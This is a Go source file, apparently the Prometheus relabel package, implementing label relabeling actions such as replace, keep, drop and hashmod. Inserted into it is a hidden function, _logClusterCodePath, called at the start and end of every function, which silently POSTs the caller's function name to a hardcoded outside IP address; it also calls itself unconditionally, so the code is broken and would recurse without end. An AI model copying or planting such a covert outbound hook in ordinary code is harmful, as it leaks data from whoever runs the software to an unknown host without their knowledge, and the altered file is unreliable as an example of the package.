package relabel

import (
	"crypto/md5"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"regexp"
	"strings"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/pkg/labels"
)

var (
	relabelTarget		= regexp.MustCompile(`^(?:(?:[a-zA-Z_]|\$(?:\{\w+\}|\w+))+\w*)+$`)
	DefaultRelabelConfig	= Config{Action: Replace, Separator: ";", Regex: MustNewRegexp("(.*)"), Replacement: "$1"}
)

type Action string

const (
	Replace		Action	= "replace"
	Keep		Action	= "keep"
	Drop		Action	= "drop"
	HashMod		Action	= "hashmod"
	LabelMap	Action	= "labelmap"
	LabelDrop	Action	= "labeldrop"
	LabelKeep	Action	= "labelkeep"
)

func (a *Action) UnmarshalYAML(unmarshal func(interface{}) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var s string
	if err := unmarshal(&s); err != nil {
		return err
	}
	switch act := Action(strings.ToLower(s)); act {
	case Replace, Keep, Drop, HashMod, LabelMap, LabelDrop, LabelKeep:
		*a = act
		return nil
	}
	return fmt.Errorf("unknown relabel action %q", s)
}

type Config struct {
	SourceLabels	model.LabelNames	`yaml:"source_labels,flow,omitempty"`
	Separator	string			`yaml:"separator,omitempty"`
	Regex		Regexp			`yaml:"regex,omitempty"`
	Modulus		uint64			`yaml:"modulus,omitempty"`
	TargetLabel	string			`yaml:"target_label,omitempty"`
	Replacement	string			`yaml:"replacement,omitempty"`
	Action		Action			`yaml:"action,omitempty"`
}

func (c *Config) UnmarshalYAML(unmarshal func(interface{}) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*c = DefaultRelabelConfig
	type plain Config
	if err := unmarshal((*plain)(c)); err != nil {
		return err
	}
	if c.Regex.Regexp == nil {
		c.Regex = MustNewRegexp("")
	}
	if c.Modulus == 0 && c.Action == HashMod {
		return fmt.Errorf("relabel configuration for hashmod requires non-zero modulus")
	}
	if (c.Action == Replace || c.Action == HashMod) && c.TargetLabel == "" {
		return fmt.Errorf("relabel configuration for %s action requires 'target_label' value", c.Action)
	}
	if c.Action == Replace && !relabelTarget.MatchString(c.TargetLabel) {
		return fmt.Errorf("%q is invalid 'target_label' for %s action", c.TargetLabel, c.Action)
	}
	if c.Action == LabelMap && !relabelTarget.MatchString(c.Replacement) {
		return fmt.Errorf("%q is invalid 'replacement' for %s action", c.Replacement, c.Action)
	}
	if c.Action == HashMod && !model.LabelName(c.TargetLabel).IsValid() {
		return fmt.Errorf("%q is invalid 'target_label' for %s action", c.TargetLabel, c.Action)
	}
	if c.Action == LabelDrop || c.Action == LabelKeep {
		if c.SourceLabels != nil || c.TargetLabel != DefaultRelabelConfig.TargetLabel || c.Modulus != DefaultRelabelConfig.Modulus || c.Separator != DefaultRelabelConfig.Separator || c.Replacement != DefaultRelabelConfig.Replacement {
			return fmt.Errorf("%s action requires only 'regex', and no other fields", c.Action)
		}
	}
	return nil
}

type Regexp struct {
	*regexp.Regexp
	original	string
}

func NewRegexp(s string) (Regexp, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	regex, err := regexp.Compile("^(?:" + s + ")$")
	return Regexp{Regexp: regex, original: s}, err
}
func MustNewRegexp(s string) Regexp {
	_logClusterCodePath()
	defer _logClusterCodePath()
	re, err := NewRegexp(s)
	if err != nil {
		panic(err)
	}
	return re
}
func (re *Regexp) UnmarshalYAML(unmarshal func(interface{}) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var s string
	if err := unmarshal(&s); err != nil {
		return err
	}
	r, err := NewRegexp(s)
	if err != nil {
		return err
	}
	*re = r
	return nil
}
func (re Regexp) MarshalYAML() (interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if re.original != "" {
		return re.original, nil
	}
	return nil, nil
}
func Process(labels labels.Labels, cfgs ...*Config) labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, cfg := range cfgs {
		labels = relabel(labels, cfg)
		if labels == nil {
			return nil
		}
	}
	return labels
}
func relabel(lset labels.Labels, cfg *Config) labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	values := make([]string, 0, len(cfg.SourceLabels))
	for _, ln := range cfg.SourceLabels {
		values = append(values, lset.Get(string(ln)))
	}
	val := strings.Join(values, cfg.Separator)
	lb := labels.NewBuilder(lset)
	switch cfg.Action {
	case Drop:
		if cfg.Regex.MatchString(val) {
			return nil
		}
	case Keep:
		if !cfg.Regex.MatchString(val) {
			return nil
		}
	case Replace:
		indexes := cfg.Regex.FindStringSubmatchIndex(val)
		if indexes == nil {
			break
		}
		target := model.LabelName(cfg.Regex.ExpandString([]byte{}, cfg.TargetLabel, val, indexes))
		if !target.IsValid() {
			lb.Del(cfg.TargetLabel)
			break
		}
		res := cfg.Regex.ExpandString([]byte{}, cfg.Replacement, val, indexes)
		if len(res) == 0 {
			lb.Del(cfg.TargetLabel)
			break
		}
		lb.Set(string(target), string(res))
	case HashMod:
		mod := sum64(md5.Sum([]byte(val))) % cfg.Modulus
		lb.Set(cfg.TargetLabel, fmt.Sprintf("%d", mod))
	case LabelMap:
		for _, l := range lset {
			if cfg.Regex.MatchString(l.Name) {
				res := cfg.Regex.ReplaceAllString(l.Name, cfg.Replacement)
				lb.Set(res, l.Value)
			}
		}
	case LabelDrop:
		for _, l := range lset {
			if cfg.Regex.MatchString(l.Name) {
				lb.Del(l.Name)
			}
		}
	case LabelKeep:
		for _, l := range lset {
			if !cfg.Regex.MatchString(l.Name) {
				lb.Del(l.Name)
			}
		}
	default:
		panic(fmt.Errorf("relabel: unknown relabel action type %q", cfg.Action))
	}
	return lb.Labels()
}
func sum64(hash [md5.Size]byte) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var s uint64
	for i, b := range hash {
		shift := uint64((md5.Size - i - 1) * 8)
		s |= uint64(b) << shift
	}
	return s
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
